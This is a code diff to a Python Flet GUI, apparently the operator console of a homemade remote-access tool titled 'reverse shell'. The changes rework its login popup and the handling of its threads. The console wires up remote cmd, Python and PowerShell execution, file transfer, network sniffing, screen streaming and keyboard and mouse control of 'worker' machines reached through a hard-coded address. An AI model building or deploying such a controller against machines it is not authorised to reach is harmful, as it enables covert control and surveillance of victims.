@@ -24,9 +24,10 @@ class App:
         self.input_required_functions: dict[str,Callable[[],ft.AlertDialog]]= {"cmd" : self.cmd,"python":self.python,"powershell":self.powershell,"receive_file":self.receive_file,"send_file":self.send_file,"sniff_from_worker":self.sniff_from_worker}
         self.page: ft.Page | None = None
         self.master = Master("10.0.0.9",5555)
-        threading.Thread(target = self.master.connect, daemon=True).start()
+        threading.Thread(target = self.master.connect).start()
+        self.greeting = ft.Text(size=30, italic=True, weight=FontWeight.BOLD, text_align=ft.alignment.center_right)
         self.title = ft.Container(
-            content=ft.Text("reverse shell", size=40, italic=True, weight=FontWeight.BOLD),
+            content=ft.Row(controls=[ft.Text("reverse shell", size=40, italic=True, weight=FontWeight.BOLD),self.greeting]),
             alignment=ft.alignment.top_center,
             bgcolor=ft.Colors.AMBER,
             margin=10,
@@ -72,16 +73,26 @@ class App:
         self.master.on_stream_stop = self.live_stream_stopped
         self.master.update_clients = self.update_clients
         self.dlg:ft.AlertDialog | None= None
-        self.ts = threading.Thread(target=self.master.show_stream, daemon=True)
-        self.tk = threading.Thread(target=self.master.control_keys,daemon=True)
-        self.tm = threading.Thread(target=self.master.control_mouse_on_worker, daemon=True)
+        self.ts = threading.Thread(target=self.master.show_stream)
+        self.tk = threading.Thread(target=self.master.control_keys)
+        self.tm = threading.Thread(target=self.master.control_mouse_on_worker)
         self.ts.start()
         self.tk.start()
         self.tm.start()
         self.user_input = ft.TextField(label="enter user name", filled=True,border=ft.InputBorder.UNDERLINE)
         self.password_input = ft.TextField(label="enter password", filled=True,border=ft.InputBorder.UNDERLINE, password=True, can_reveal_password=True)
-        self.user:bool = False
-        self.admin:bool = False
+        self.success = ft.Text()
+        self.login_popup = ft.AlertDialog(
+            title="login",
+            content=ft.Column(
+                controls=[
+                 self.user_input,
+                 self.password_input,
+                 ft.OutlinedButton(text="submit", on_click=self.submit_user),self.success
+                 ],
+            tight=True,
+            spacing=10,
+            horizontal_alignment=ft.CrossAxisAlignment.CENTER))
 
     def submit_user(self,e):
         username = self.user_input.value
@@ -90,25 +101,28 @@ class App:
             return
         credentials = self.master.login(username, password)
         if credentials == "admin":
-            self.user = True
-            self.admin = True
-            return
-        if credentials == "user":
-            self.user = True
-            return
-
-
-    def chosen_client(self, e):
-        self.master.cur_ip = self.workers.value
-        self.page.open(ft.AlertDialog(content=ft.Column(controls=[self.user_input,self.password_input,ft.OutlinedButton(text="submit", on_click=self.submit_user)])))
-        if self.admin:
+            self.greeting.value = "hello admin "+ username
             self.commands.disabled = False
             self.control_mouse.disabled = False
             self.control_keys.disabled = False
             self.livestream.disabled = False
-        elif self.user:
+            self.page.update()
+            self.page.close(self.login_popup)
+
+        elif credentials == "user":
+            self.greeting.value = "hello user " + username
             self.commands.disabled = False
-        self.page.update()
+            self.page.update()
+            self.page.close(self.login_popup)
+
+        else:
+            self.success.value = credentials
+            self.page.update(self.login_popup)
+
+
+    def chosen_client(self, e):
+        self.master.cur_ip = self.workers.value
+        self.page.open(self.login_popup)
     def control_mouse_of_worker(self,e):
         self.master.control_mouse = self.control_mouse.value
     def control_keys_pressed(self,e):
